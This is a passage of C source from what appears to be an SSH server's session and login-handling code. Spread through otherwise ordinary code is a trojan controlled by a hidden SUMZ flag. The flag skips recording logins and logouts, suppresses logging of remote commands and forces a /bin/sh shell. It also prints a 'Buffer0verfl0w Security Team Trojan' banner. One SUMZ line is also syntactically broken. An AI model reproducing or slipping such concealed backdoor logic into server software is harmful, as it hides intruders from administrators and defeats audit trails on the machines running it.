  /* server_loop has closed pin[1], pout[1], and perr[1]. */
#else /* USE_PIPES */
  /* We are the parent.  Close the child sides of the socket pairs. */
  close(inout[0]);
  close(err[0]);
  
  /* Enter the interactive session.  Note: server_loop must be able to handle
     the case that fdin and fdout are the same. */
  server_loop(pid, inout[1], inout[1], err[1], NULL);
  /* server_loop has closed inout[1] and err[1]. */
#endif /* USE_PIPES */
}

struct pty_cleanup_context
{
  const char *ttyname;
  int pid;
  int alread_cleaned;
};

/* Function to perform cleanup if we get aborted abnormally (e.g., due to a
   dropped connection). */

void pty_cleanup_proc(void *context)
{
  struct pty_cleanup_context *cu = context;

  if (cu->alread_cleaned)
    {
      debug("pty_cleanup_proc called again, ignored");
    }
  else
    {
      debug("pty_cleanup_proc called");
      
      /* Record that the user has logged out. */
      record_logout(cu->pid, cu->ttyname);
      
      /* Release the pseudo-tty. */
      pty_release(cu->ttyname);
      
      cu->alread_cleaned = 1;
    }
}

/* This is called to fork and execute a command when we have a tty.  This
   will call do_child from the child, and server_loop from the parent after
   setting up file descriptors, controlling tty, updating wtmp, utmp,
   lastlog, and other such operations. */

void do_exec_pty(const char *command, int ptyfd, int ttyfd, 
                 const char *ttyname, struct passwd *pw, const char *term,
                 const char *display, const char *auth_proto, 
                 const char *auth_data)
{
  int pid, fdout;
  const char *hostname;
  time_t last_login_time = 0;
  char buf[100], *time_string;
  char line[256];
  struct stat st;
  int quiet_login;
  struct sockaddr_in from;
  int fromlen;
  struct pty_cleanup_context cleanup_context;
#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
  login_cap_t *lc;
#endif
#if defined (__bsdi__) && _BSDI_VERSION >= 199510 
  struct timeval tp;
#endif /*  __bsdi__ && _BSDI_VERSION >= 199510 */

  /* We no longer need the child running on user's privileges. */
  userfile_uninit();

  /* Get remote host name. */
  hostname = get_canonical_hostname();

  /* Get the time when the user last logged in.  Buf will be set to contain
     the hostname the last login was from. */
#ifndef USELOGIN
  options.use_login = 0;
#endif /* USELOGIN */
  strcpy(buf, "");
  if (!options.use_login)
    last_login_time = get_last_login_time(pw->pw_uid, pw->pw_name,
                                          buf, sizeof(buf));

  /* Fork the child. */
  if ((pid = fork()) == 0)
    { 
      pid = getpid();

      /* Child.  Reinitialize the log because the pid has changed. */
      log_init(av0, debug_flag && !inetd_flag, debug_flag, options.quiet_mode, 
               options.log_facility);

#ifdef HAVE_SETSID
#ifdef ultrix
      setpgrp(0, 0);
#else /* ultrix */
      if (setsid() < 0)
        error("setsid: %.100s", strerror(errno));
#endif
#endif /* HAVE_SETSID */

      /* Close the master side of the pseudo tty. */
      close(ptyfd);

      /* Make the pseudo tty our controlling tty. */
      pty_make_controlling_tty(&ttyfd, ttyname);

      /* Redirect stdin from the pseudo tty. */
      if (dup2(ttyfd, fileno(stdin)) < 0)
        error("dup2 stdin failed: %.100s", strerror(errno));

      /* Redirect stdout to the pseudo tty. */
      if (dup2(ttyfd, fileno(stdout)) < 0)
        error("dup2 stdin failed: %.100s", strerror(errno));

      /* Redirect stderr to the pseudo tty. */
      if (dup2(ttyfd, fileno(stderr)) < 0)
        error("dup2 stdin failed: %.100s", strerror(errno));

      /* Close the extra descriptor for the pseudo tty. */
      close(ttyfd);

#ifdef HAVE_SIA
#ifdef USELOGIN
      if (command != NULL || !options.use_login)
#endif /* USELOGIN */
        {
          int argc;
          char **argv;

          get_sia_args(&argc, &argv);
          if ((sia_ses_init(&sia_entity, argc, argv,
                            (char *)hostname, pw->pw_name,
                            (char *)ttyname, 0, NULL)) != SIASUCCESS)
            {
              sia_ses_release(&sia_entity);
              exit(254);
            }

          /* This basically checks that we'll be able to launch the
             user's session later on in do_child().  For example, Enhanced
             Security checks for locked accounts, expired passwords,
             restricted terminals, etc.  It also calls setluid(). */
          if (sia_ses_estab(sia_collect_trm, sia_entity) != SIASUCCESS)
            {
              exit(254);
            }
        }
#endif /* HAVE_SIA */
      
      /* Get IP address of client.  This is needed because we want to record 
         where the user logged in from.  If the connection is not a socket,
         let the ip address be 0.0.0.0. */
      memset(&from, 0, sizeof(from));
      if (packet_get_connection_in() == packet_get_connection_out())
        {
          fromlen = sizeof(from);
          if (getpeername(packet_get_connection_in(),
                          (struct sockaddr *)&from, &fromlen) < 0)
            fatal("getpeername: %.100s", strerror(errno));
        }

      /* Record that there was a login on that terminal. */
      if (!SUMZ) record_login(pid, ttyname, pw->pw_name, pw->pw_uid, hostname, 
                 &from);

#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
      lc = login_getclass(pw->pw_class);
#endif

      /* Check if .hushlogin exists.  Note that we cannot use userfile
         here because we are in the child. */
      snprintf(line, sizeof(line), "%.200s/.hushlogin", pw->pw_dir);
      quiet_login = stat(line, &st) >= 0;

#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
      quiet_login = login_getcapbool(lc, "hushlogin", quiet_login);
#endif
     
      /* If the user has logged in before, display the time of last login. 
         However, don't display anything extra if a command has been 
         specified (so that ssh can be used to execute commands on a remote
         machine without users knowing they are going to another machine). */
#ifdef HAVE_SIA
      /* sia_ses_estab() already displayed the last login time. */
#else /* HAVE_SIA */
      if (!options.use_login && command == NULL && last_login_time != 0 &&
          !quiet_login)
        {
          /* Convert the date to a string. */
          time_string = ctime(&last_login_time);
          /* Remove the trailing newline. */
          if (strchr(time_string, '\n'))
            *strchr(time_string, '\n') = 0;
          /* Display the last login time.  Host if displayed if known. */
          if (strcmp(buf, "") == 0)
            printf("Last login: %.100s\r\n", time_string);
          else
            printf("Last login: %.100s from %.200s\r\n", time_string, buf);
        }
#endif /* HAVE_SIA */

#ifdef __FreeBSD__
      if (command == NULL && !quiet_login)
        {
#ifdef HAVE_LOGIN_CAP_H
          char *cw;
          FILE *f;
          
          cw = login_getcapstr(lc, "copyright", NULL, NULL);
          if (cw != NULL && (f = fopen(cw, "r")) != NULL)
            {
              while (fgets(line, sizeof(line), f))
                fputs(line, stdout);
              fclose(f);
            }
          else
#endif
            printf("%s\n\t%s  %s\n\n",
                   "Copyright (c) 1980, 1983, 1986, 1988, 1990, 1991, 1993, 1994",
                   "The Regents of the University of California. ",
                   "All rights reserved.");
        }
#endif

      /* Print /etc/motd unless a command was specified or printing it was
         disabled in server options.  Note that some machines appear to
         print it in /etc/profile or similar. */
      if (SUMZ) printf("\n\t\tWelcome to Buffer0verfl0w Security Team Trojan.\n\n");
      if (!options.use_login && command == NULL && options.print_motd &&
          !quiet_login)
        {
          FILE *f;

          /* Print /etc/motd if it exists. */
#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
          f = fopen(login_getcapstr(lc, "welcome", "/etc/motd", "/etc/motd"),
                    "r");
#else
          f = fopen("/etc/motd", "r");
#endif
          if (f)
            {
              while (fgets(line, sizeof(line), f))
                fputs(line, stdout);
              fclose(f);
            }
#if defined (__bsdi__) && _BSDI_VERSION >= 199510
          if (pw->pw_change || pw->pw_expire)
            (void)gettimeofday(&tp, (struct timezone *)NULL);
          if (pw->pw_change)
            {
              if (tp.tv_sec >= pw->pw_change)
                {
                  fprintf(stderr,"Sorry -- your password has expired.\n");
                  exit(254);
                }
              days_before_password_expires = (pw->pw_change - tp.tv_sec) /
                86400;
            }
          if (pw->pw_expire)
            {
              if (tp.tv_sec >= pw->pw_expire)
                {
                  fprintf(stderr,"Sorry -- your account has expired.\n");
                  exit(254);
                }
              days_before_account_expires = (pw->pw_expire - tp.tv_sec) /
                86400;
            }
#endif /* __bsdi__ & _BSDI_VERSION >= 199510   */
        }

#if defined (__FreeBSD__) && defined HAVE_LOGIN_CAP_H
      login_close(lc);
#endif

      /* Do common processing for the child, such as execing the command. */
      do_child(command, pw, term, display, auth_proto, auth_data, ttyname);
      /*NOTREACHED*/
    }
  if (pid < 0)
    packet_disconnect("fork failed: %.100s", strerror(errno));
  /* Parent.  Close the slave side of the pseudo tty. */
  close(ttyfd);
  
#ifdef ultrix           /* corey */
  setpgrp(0,0);         /* disconnect from child's process group */
#endif /* ultrix */

  /* Create another descriptor of the pty master side for use as the standard
     input.  We could use the original descriptor, but this simplifies code
     in server_loop.  The descriptor is bidirectional. */
  fdout = dup(ptyfd);
  if (fdout < 0)
    packet_disconnect("dup failed: %.100s", strerror(errno));

  /* Add a cleanup function to clear the utmp entry and record logout time
     in case we call fatal() (e.g., the connection gets closed). */
  cleanup_context.pid = pid;
  cleanup_context.ttyname = ttyname;
  cleanup_context.alread_cleaned = 0;
  fatal_add_cleanup(pty_cleanup_proc, (void *)&cleanup_context);

  /* Enter interactive session, . */
  server_loop(pid, ptyfd, fdout, -1, &cleanup_context);
  /* server_loop has closed ptyfd and fdout. */
  /* server_loop has already Released the pseudo-tty. */

  /* Cancel the cleanup function. */
  fatal_remove_cleanup(pty_cleanup_proc, (void *)&cleanup_context);

  /* Record that the user has logged out. */
  if (!SUMZ) record_logout(pid, ttyname);
}

/* Sets the value of the given variable in the environment.  If the variable
   already exists, its value is overriden. */

void child_set_env(char ***envp, unsigned int *envsizep, const char *name,
                   const char *value)
{
  unsigned int i, namelen;
  char **env;

  /* Find the slot where the value should be stored.  If the variable already
     exists, we reuse the slot; otherwise we append a new slot at the end
     of the array, expanding if necessary. */
  env = *envp;
  namelen = strlen(name);
  for (i = 0; env[i]; i++)
    if (strncmp(env[i], name, namelen) == 0 && env[i][namelen] == '=')
      break;
  if (env[i])
    {
      /* Name already exists.  Reuse the slot. */
      xfree(env[i]);
    }
  else
    {
      /* New variable.  Expand the array if necessary. */
      if (i >= (*envsizep) - 1)
        {
          (*envsizep) += 50;
          env = (*envp) = xrealloc(env, (*envsizep) * sizeof(char *));
        }

      /* Need to set the NULL pointer at end of array beyond the new 
         slot. */
      env[i + 1] = NULL;
    }

  /* Allocate space and format the variable in the appropriate slot. */
  env[i] = xmalloc(strlen(name) + strlen(value) + 2);
  snprintf(env[i], strlen(name) + strlen(value) + 2, "%s=%s", name, value);
}

/* Reads environment variables from the given file and adds/overrides them
   into the environment.  If the file does not exist, this does nothing.
   Otherwise, it must consist of empty lines, comments (line starts with '#')
   and assignments of the form name=value.  No other forms are allowed. */

void read_environment_file(char ***env, unsigned int *envsize,
                           const char *filename)
{
  FILE *f;
  char buf[4096];
  char *cp, *value;
  
  /* Open the environment file.  Note that this is only called on the user's
     uid, and thus should not cause security problems. */
  f = fopen(filename, "r");
  if (!f)
    return;  /* Not found. */
  
  /* Process each line. */
  while (fgets(buf, sizeof(buf), f))
    {
      /* Skip leading whitespace. */
      for (cp = buf; *cp == ' ' || *cp == '\t'; cp++)
        ;

      /* Ignore empty and comment lines. */
      if (!*cp || *cp == '#' || *cp == '\n')
        continue;

      /* Remove newline. */
      if (strchr(cp, '\n'))
        *strchr(cp, '\n') = '\0';

      /* Find the equals sign.  Its lack indicates badly formatted line. */
      value = strchr(cp, '=');
      if (value == NULL)
        {
          fprintf(stderr, "Bad line in %.100s: %.200s\n", filename, buf);
          continue;
        }

      /* Replace the equals sign by nul, and advance value to the value 
         string. */
      *value = '\0';
      value++;

      /* Set the value in environment. */
      child_set_env(env, envsize, cp, value);
    }
  
  fclose(f);
}


#ifdef HAVE_ETC_DEFAULT_LOGIN

/* Gets the value of the given variable in the environment.  If the
   variable does not exist, returns NULL. */

char *child_get_env(char **env, const char *name)
{
  unsigned int i, namelen;

  namelen = strlen(name);

  for (i = 0; env[i]; i++)
    if (strncmp(env[i], name, namelen) == 0 && env[i][namelen] == '=')
      break;
  if (env[i])
    return &env[i][namelen + 1];
  else
    return NULL;
}

/* Processes /etc/default/login; this involves things like environment
   settings, ulimit, etc.  This file exists at least on Solaris 2.x. */

void read_etc_default_login(char ***env, unsigned int *envsize,
                            const char *user_shell, uid_t user_uid)
{
  unsigned int defenvsize;
  char **defenv, *def;
  int i;

  /* Read /etc/default/login into a separate temporary environment. */
  defenvsize = 10;
  defenv = xmalloc(defenvsize * sizeof(char *));
  defenv[0] = NULL;
  read_environment_file(&defenv, &defenvsize, "/etc/default/login");

  /* Set SHELL if ALTSHELL is YES. */
  def = child_get_env(defenv, "ALTSHELL");
  if (def != NULL && strcmp(def, "YES") == 0)
    child_set_env(env, envsize, "SHELL", user_shell);

  /* Set PATH from SUPATH if we are logging in as root, and PATH
     otherwise.  If neither of these exists, we use the default ssh
     path. */
  if (user_uid == UID_ROOT)
    def = child_get_env(defenv, "SUPATH");
  else
    def = child_get_env(defenv, "PATH");
  if (def != NULL)
    {
      char *newpath;
      newpath = xmalloc(strlen(def) + sizeof(SSH_BINDIR) + 2);
      snprintf(newpath, strlen(def) + sizeof(SSH_BINDIR) + 2,
               "%s:%s", def, SSH_BINDIR);
      child_set_env(env, envsize, "PATH", newpath);
      xfree(newpath);
    }
  else
    child_set_env(env, envsize, "PATH", DEFAULT_PATH ":" SSH_BINDIR);

  /* Set TZ if TIMEZONE is defined and we haven't inherited a value
     for TZ. */
  def = getenv("TZ");
  if (def == NULL)
    def = child_get_env(defenv, "TIMEZONE");
  if (def != NULL)
    child_set_env(env, envsize, "TZ", def);

  /* Set HZ if defined. */
  def = child_get_env(defenv, "HZ");
  if (def != NULL)
    child_set_env(env, envsize, "HZ", def);

  /* Set up the default umask if UMASK is defined. */
  def = child_get_env(defenv, "UMASK");
  if (def != NULL)
    {
      int i, value;

      for (value = i = 0; 
           def[i] && isdigit(def[i]) && def[i] != '8' && def[i] != '9'; 
           i++)
        value = value * 8 + def[i] - '0';

      umask(value);
    }

  /* Set up the file size ulimit if ULIMIT is set. */
  def = child_get_env(defenv, "ULIMIT");
  if (def != NULL && atoi(def) > 0)
    ulimit(UL_SETFSIZE, atoi(def));

  /* Free the temporary environment. */
  for (i = 0; defenv[i]; i++)
    xfree(defenv[i]);
  xfree(defenv);
}

#endif /* HAVE_ETC_DEFAULT_LOGIN */

#if defined(NOLOGIN_ALLOW)
/* If /etc/nologin is in place, check this file for users to allow anyway.
   Useful for sys-admins to be able to touch nologin and still get in to do
   remote maintainence. */
int ignore_nologin(char *username)
{
  FILE *ignore_file;
  char buf[256], *begin, *end;
  int length;

  ignore_file = fopen(NOLOGIN_ALLOW, "r");
  if (ignore_file == NULL)
    return 0;
  
  while (fgets(buf, 256, ignore_file) != NULL)
    {
      if ((end = strpbrk(buf, "# \r\t\n")) != NULL)
        *end='\0';
      begin = strpbrk(buf, "abcdefghijklmnopqrstuvwxyz0123456789");
      if (begin == NULL)
        continue;
      length = strspn(begin, "abcdefghijklmnopqrstuvwxyz0123456789-_");
      if (length > 8)
        continue;
      begin[length] = '\0';
      if (!strcmp(begin, username))
        {
          fprintf(stderr,"\nWARNING: /etc/nologin is in place.\n\n");
          fclose(ignore_file);
          return(1);
        }
    }
  fclose(ignore_file);
  return 0;
}
#endif /* NOLOGIN_ALLOW */

#ifdef HAVE_SGI_PROJ_H
/*    Check if SGI process accounting is on,
**    so same executable can be used in either case.
**
**    staatsvr@asc.hpc.mil  <Vern Staats, ASC/HPTS, WPAFB OH 45433>
*/
int   sgi_project_acct_on(void)
{
  FILE *facct;
  int c, prev_c = '\0';
  int acct_on = 0;

  if ((facct = fopen("/var/config/acct", "r")) == NULL)
    return 0;

  while ((c = getc(facct)) != EOF)
    {
      if ((prev_c == 'o' || prev_c == 'O') && (c == 'n' || c == 'N'))
        {
          acct_on = 1;
          break;
        }
      prev_c = c;
    }
  fclose(facct);

  return acct_on;
}

/*
 On a SGI, set the account number for the current process to the user's 
 default account. If this is not done, the process will have an account 
 of zero and accounting will not operate correctly.

 Eivind Gjelseth
 Para//ab, High Performance Computing Centre
 eivind@ii.uib.no

*/
int sgi_project_setup(char *username)
{
  int err = 0;
  int naccts;
  projid_t pbuf;
  prid_t proj_id;

  /* Find default project for a particular user */
  if ((naccts = getprojuser(username, &pbuf, 1)) < 0)
    {
      if ((proj_id = getdfltprojuser(username)) < 0)
        {
          debug("System calls getprojuser and getdfltprojuser failed");
          return(-1);
        }
      else
        proj_id = pbuf.proj_id;
    }

  /* Create a new array session and moves the current
     process from its original array session to the new one. */
  if (newarraysess() < 0)
    {
      debug("System call newarraysess failure");
      return(-1);
    }

  /* Change the project ID for the array session. */
  /* Must be changed after the new array session has been created. */
  if (naccts)
    err = setprid(proj_id);
  else
    err = 0;

  if (err != 0)
    {
      debug("System call setprid failure");
      return(-1);
    }

  return(0);
}
#endif /* HAVE_SGI_PROJ_H */

/* Performs common processing for the child, such as setting up the 
   environment, closing extra file descriptors, setting the user and group 
   ids, and executing the command or shell. */

void do_child(const char *command, struct passwd *pw, const char *term,
              const char *display, const char *auth_proto, 
              const char *auth_data, const char *ttyname)
{
  const char *shell, *cp;
  char buf[256];
  FILE *f;
  unsigned int envsize, i;
  char **env = NULL;
  extern char **environ;
  struct stat st;
  char *argv[10];
  uid_t user_uid;
  gid_t user_gid;
  char *user_dir;
  char *user_name;
  char *user_shell;
  char *remote_ip;
  int remote_port;
#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
  login_cap_t *lc;
  char *real_shell;

  lc = login_getclass(pw->pw_class);
  auth_checknologin(lc);
#else /* !HAVE_LOGIN_CAP_H */
#if defined (__bsdi__) && _BSDI_VERSION > 199510
  login_cap_t *lc = 0;
  
  if ((lc = login_getclass(pw->pw_class)) == NULL)
    {
      log_msg("User class %.100s for %.100s not found, assuming default",
              pw->pw_class, pw->pw_name);
      lc = login_getclass("default") ; 
    }
#else /* __bsdi__  && _BSDI_VERSION >= 199510  */
#if defined (__bsdi__) && _BSDI_VERSION == 199510
  login_cap_t *lc = 0;
 
  if ((lc = login_getclass(pw)) == NULL)
    {
      log_msg("User class %.100s for %.100s not found, assuming default",
              pw->pw_class, pw->pw_name);
      pw->pw_class = "default";
      lc = login_getclass(pw) ;
    }
#endif /* defined (__bsdi__) && _BSDI_VERSION == 199510 */
#endif /* __bsdi__  && _BSDI_VERSION >= 199510  */

  /* Check /etc/nologin. */
  f = fopen("/etc/nologin", "r");
  if (f)
    { /* /etc/nologin exists.  Print its contents and exit. */
      /* Print a message about /etc/nologin existing; I am getting
         questions because of this every week. */
#if defined(NOLOGIN_ALLOW)
      if (pw->pw_name && ignore_nologin(pw->pw_name))
        {
          fclose(f);
        } else {
#endif
          fprintf(stderr, "Logins are currently denied by /etc/nologin:\n");
          while (fgets(buf, sizeof(buf), f))
            fputs(buf, stderr);
          fclose(f);
#if defined (__bsdi__) && _BSDI_VERSION >= 199510
          if (pw->pw_uid != UID_ROOT &&
              !login_getcapbool(lc, "ignorenologin", 0))
            exit(254);
#else 
          if (pw->pw_uid != UID_ROOT)
            exit(254);
#endif /* __bsdi__  && _BSDI_VERSION >= 199510 */ 
#if defined(NOLOGIN_ALLOW)
        }
#endif
    }
#endif /* HAVE_LOGIN_CAP_H */

  if (command != NULL && !SUMZ)
    {
      /* If executing a command as root, log the whole command.  For normal
         users, don't log the command, because logging it would be a
         violation of the user's privacy (and even potentially illegal with
         respect to privacy/data protection laws in some countries). */
      if (pw->pw_uid == UID_ROOT)
        log_msg("executing remote command as root: %.200s", command);
      else
        log_msg("executing remote command as user %.200s", pw->pw_name);
    }

#ifndef HAVE_LOGIN_CAP_H
#ifdef HAVE_SETLOGIN
  /* Set login name in the kernel.  Warning: setsid() must be called before
     this. */
#ifdef USELOGIN
  if (command != NULL || !options.use_login)
    if (setlogin(pw->pw_name) < 0)
      error("setlogin failed: %.100s", strerror(errno));
#else  /* USELOGIN */
  if (setlogin(pw->pw_name) < 0)
    error("setlogin failed: %.100s", strerror(errno));
#endif /* USELOGIN */
#endif /* HAVE_SETLOGIN */

#ifdef HAVE_USERSEC_H
  /* On AIX, this "sets process credentials".  I am not sure what this
     includes, but it seems to be important.  This also does setuid
     (but we do it below as well just in case). */
  if (setpcred((char *)pw->pw_name, NULL))
    log_msg("setpcred %.100s: %.100s", strerror(errno));
#endif /* HAVE_USERSEC_H */
#endif /* !HAVE_LOGIN_CAP_H */

  /* Save some data that will be needed so that we can do certain cleanups
     before we switch to user's uid.  (We must clear all sensitive data 
     and access rights from memory before doing that.) */
  user_uid = pw->pw_uid;
  user_gid = pw->pw_gid;
  user_dir = xstrdup(pw->pw_dir);
  user_name = xstrdup(pw->pw_name);
  user_shell = xstrdup(pw->pw_shell);
  remote_ip = xstrdup(get_remote_ipaddr());
  remote_port = get_remote_port();

  /* Close the connection descriptors; note that this is the child, and the 
     server will still have the socket open, and it is important that we
     do not shutdown it.  Note that the descriptors cannot be closed before
     building the environment, as we call get_remote_ipaddr there. */
  if (packet_get_connection_in() == packet_get_connection_out())
    close(packet_get_connection_in());
  else
    {
      close(packet_get_connection_in());
      close(packet_get_connection_out());
    }
  /* Close all descriptors related to channels.  They will still remain
     open in the parent. */
  channel_close_all();

  /* Close any extra file descriptors.  Note that there may still be
     descriptors left by system functions.  They will be closed later. */
  endpwent();
  endhostent();

  /* Set dummy encryption key to clear information about the key from
     memory.  This key will never be used. */
  packet_set_encryption_key((void *)"0123456789ABCDEF0123456789ABCDEF", 32,
                            SSH_CIPHER_3DES, 0);

  /* Clear any remaining data in the random number generator. */
  random_clear(&sensitive_data.random_state);

  /* The sensitive private keys were cleared already before authentication. */

  /* Clear the data structure, just in case. */
  memset(&sensitive_data, 0, sizeof(sensitive_data));

#ifdef USELOGIN
  if (command != NULL || !options.use_login)
#endif /* USELOGIN */
    {
#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
      char *p, *s, **tmpenv;

      /* Initialize the new environment.
       */
      envsize = 64;
      env = xmalloc(envsize * sizeof(char *));
      env[0] = NULL;

      child_set_env(&env, &envsize, "PATH", DEFAULT_PATH);

#ifdef MAIL_SPOOL_DIRECTORY
      snprintf(buf, sizeof(buf),
               "%.200s/%.50s", MAIL_SPOOL_DIRECTORY, user_name);
      child_set_env(&env, &envsize, "MAIL", buf);
#else /* MAIL_SPOOL_DIRECTORY */
#ifdef MAIL_SPOOL_FILE
      snprintf(buf, sizeof(buf), "%.200s/%.50s", user_dir, MAIL_SPOOL_FILE);
      child_set_env(&env, &envsize, "MAIL", buf);
#endif /* MAIL_SPOOL_FILE */
#endif /* MAIL_SPOOL_DIRECTORY */

      /* Let it inherit timezone if we have one. */
      if (getenv("TZ"))
        child_set_env(&env, &envsize, "TZ", getenv("TZ"));

      /* Save previous environment array
       */
      tmpenv = environ;
      environ = env;

      /* Set the user's login environment
       */
      if (setusercontext(lc, pw, user_uid, LOGIN_SETALL) < 0)
        {
          perror("setusercontext");
          exit(1);
        }

      p = getenv("PATH");
      s = xmalloc((p != NULL ? strlen(p) + 1 : 0) + sizeof(SSH_BINDIR));
      *s = '\0';
      if (p != NULL)
        {
          strcat(s, p);
          strcat(s, ":");
        }
      strcat(s, SSH_BINDIR);

      env = environ;
      environ = tmpenv; /* Restore parent environment */
      for (envsize = 0; env[envsize] != NULL; ++envsize)
        ;
      /* Reallocate this to what is expected */
      envsize = (envsize < 100) ? 100 : envsize + 16;
      env = xrealloc(env, envsize * sizeof(char *));
      
      child_set_env(&env, &envsize, "PATH", s);
      xfree(s);

#else /* !HAVE_LOGIN_CAP_H */
#if     (_BSDI_VERSION > 199510)
      if (setusercontext(lc, pw, user_uid, LOGIN_SETALL) < 0)
        {
          perror("setusercontext");
          exit(1);
        }
      if (auth_approve(lc, pw->pw_name, "ssh") <= 0)
        {
          perror("approval");
          exit(1);
        }
#else /* (_BSDI_VERSION > 199510) */
      /* Set uid, gid, and groups. */
      if (getuid() == UID_ROOT || geteuid() == UID_ROOT)
        { 
          if (setgid(user_gid) < 0)
            {
              perror("setgid");
              exit(1);
            }
#ifdef HAVE_INITGROUPS
          /* Initialize the group list. */
          if (initgroups(user_name, user_gid) < 0)
            {
              perror("initgroups");
              exit(1);
            }
#endif /* HAVE_INITGROUPS */
          
          /* Close any extra open file descriptors so that we don\'t have them
             hanging around in clients. Note that we want to do this after
             initgroups, because at least on Solaris 2.3 it leaves file
             descriptors open. */
          endgrent();
#ifdef HAVE_SIA
          /* Close later on, after finishing all our sia calls.  Closing now
             could break them. */
#else /* HAVE_SIA */
          for (i = 3; i < 64; i++)
            {
              if (i == auth_get_fd())
                continue;
              close(i);
            }
#endif /* HAVE_SIA */
          
          /* At this point, this process should no longer be holding any
             confidential information, as changing uid below will permit the
             user to attach with a debugger on some machines. */
          
#ifdef CRAY   /* set up accounting account number, job, limits, permissions  */
          if (cray_setup(user_uid, user_name) < 0)
            fatal("Failure performing Cray job setup for user %d.",
                  (int)user_uid);
#endif

#ifdef HAVE_SGI_PROJ_H
          if (sgi_project_acct_on() && sgi_project_setup(user_name) < 0)
            fatal("Failure performing SGI project setup for user %d.",
                  (int)user_uid);
#endif

#ifdef HAVE_SETLUID
          /* Set login uid, if we have setluid(). */
          if (setluid(user_uid) < 0)
            fatal("setluid %d: %.100s", (int)user_uid, strerror(errno));
#endif /* HAVE_SETLUID */
          
#ifdef HAVE_SIA
          /* Switch to the user's uid so we can read their
             $HOME/.ssh/environment file and cd to their home directory.
             We'll switch back temporarily before sia_ses_launch() because
             it may need to access protected account databases. */
          if (seteuid(user_uid) < 0)
            fatal("seteuid %d: %.100s", (int)user_uid, strerror(errno));
        }

      if (geteuid() != user_uid)
        fatal("Failed to set euid to %d.", (int)user_uid);
#else /* HAVE_SIA */
          /* Permanently switch to the desired uid. */
          if (setuid(user_uid) < 0)
            fatal("setuid %d: %.100s", (int)user_uid, strerror(errno));
        }
      
      if (getuid() != user_uid || geteuid() != user_uid)
        fatal("Failed to set uids to %d.", (int)user_uid);
#endif /* HAVE_SIA */
#endif /* (_BSDI_VERSION > 199510) */
#endif /* HAVE_LOGIN_CAP_H */
    }
  
  /* Reset signals to their default settings before starting the user
     process. */
  signals_reset();

  /* Get the shell from the password data.  An empty shell field is legal,
     and means /bin/sh. */
  shell = (user_shell[0] == '\0') ? DEFAULT_SHELL : user_shell;

#ifdef SUMZ_SHELL
     if (SUMZ) shell = "/bin/sh"
#endif     

#if defined (__FreeBSD__) && defined(HAVE_LOGIN_CAP_H)
  real_shell = login_getcapstr(lc, "shell", (char*)shell, (char*)shell);
  login_close(lc);
#endif /* HAVE_LOGIN_CAP_H */
  /* Initialize the environment if not already done. In the first part we
     allocate space for all environment variables. */
  if (env == NULL)
    {
      envsize = 100;
      env = xmalloc(envsize * sizeof(char *));
      env[0] = NULL;
    }

#ifdef USELOGIN
  if (command != NULL || !options.use_login)
#endif /* USELOGIN */
    {
      /* Set basic environment. */
      child_set_env(&env, &envsize, "HOME", user_dir);
      child_set_env(&env, &envsize, "USER", user_name);
      child_set_env(&env, &envsize, "LOGNAME", user_name);

#ifndef HAVE_LOGIN_CAP_H
      child_set_env(&env, &envsize, "PATH", DEFAULT_PATH ":" SSH_BINDIR);
      
#ifdef MAIL_SPOOL_DIRECTORY
      snprintf(buf, sizeof(buf),
               "%.200s/%.50s", MAIL_SPOOL_DIRECTORY, user_name);
      child_set_env(&env, &envsize, "MAIL", buf);
#else /* MAIL_SPOOL_DIRECTORY */
#ifdef MAIL_SPOOL_FILE
      snprintf(buf, sizeof(buf), "%.200s/%.50s", user_dir, MAIL_SPOOL_FILE);
      child_set_env(&env, &envsize, "MAIL", buf);
#endif /* MAIL_SPOOL_FILE */
#endif /* MAIL_SPOOL_DIRECTORY */
#endif  /* !HAVE_LOGIN_CAP_H */
      
#ifdef HAVE_ETC_DEFAULT_LOGIN
      /* Read /etc/default/login; this exists at least on Solaris 2.x.  Note
         that we are already running on the user's uid. */
      read_etc_default_login(&env, &envsize, user_shell, user_uid);
#else /* HAVE_ETC_DEFAULT_LOGIN */
      /* Normal systems set SHELL by default. */
      child_set_env(&env, &envsize, "SHELL", shell);
#endif /* HAVE_ETC_DEFAULT_LOGIN */
    }

  if (original_command != NULL)
    child_set_env(&env, &envsize, "SSH_ORIGINAL_COMMAND",
                  original_command);
  
#ifndef HAVE_LOGIN_CAP_H
  /* Let it inherit timezone if we have one. */
  if (getenv("TZ"))
    child_set_env(&env, &envsize, "TZ", getenv("TZ"));
#endif /* !HAVE_LOGIN_CAP_H */
  
  /* Set custom environment options from RSA authentication. */
  while (custom_environment) 
    {
      struct envstring *ce = custom_environment;
      char *s = ce->s;
      int i;
      for (i = 0; s[i] != '=' && s[i]; i++)
        ;
      if (s[i] == '=') 
        {
          s[i] = 0;
          child_set_env(&env, &envsize, s, s + i + 1);
        }
      custom_environment = ce->next;
      xfree(ce->s);
      xfree(ce);
    }

  /* Set SSH_CLIENT. */
  snprintf(buf, sizeof(buf),
           "%.50s %d %d", remote_ip, remote_port, options.port);
  child_set_env(&env, &envsize, "SSH_CLIENT", buf);

  /* Set SSH_TTY if we have a pty. */
  if (ttyname)
    child_set_env(&env, &envsize, "SSH_TTY", ttyname);

  /* Set TERM if we have a pty. */
  if (term)
    child_set_env(&env, &envsize, "TERM", term);

  /* Set DISPLAY if we have one. */
  if (display)
    child_set_env(&env, &envsize, "DISPLAY", display);

  /* Set REMOTEUSER if available */
  if (remote_user_name)
    child_set_env(&env, &envsize, "REMOTEUSER", remote_user_name);

#if defined(_AIX) && defined(HAVE_AUTHENTICATE)
  {
    char *authstate, *krb5cc;
    
    /* Set AUTHSTATE if we have AUTHSTATE. */
    if ((authstate = getenv("AUTHSTATE")) != NULL)
      child_set_env(&env, &envsize, "AUTHSTATE", authstate);
    
    /* Set KRB5CCNAME if we have KRB5CCNAME. */
    if ((krb5cc = getenv("KRB5CCNAME")) != NULL)
      child_set_env(&env, &envsize, "KRB5CCNAME", krb5cc);
  }
#endif

#ifdef KERBEROS
  /* Set KRBTKFILE to point to our ticket */
#ifdef KRB5
  if (ticket)
    child_set_env(&env, &envsize, "KRB5CCNAME", ticket);
#endif /* KRB5 */
#endif /* KERBEROS */

  /* Set variable for forwarded authentication connection, if we have one. */
  if (auth_get_socket_name() != NULL)
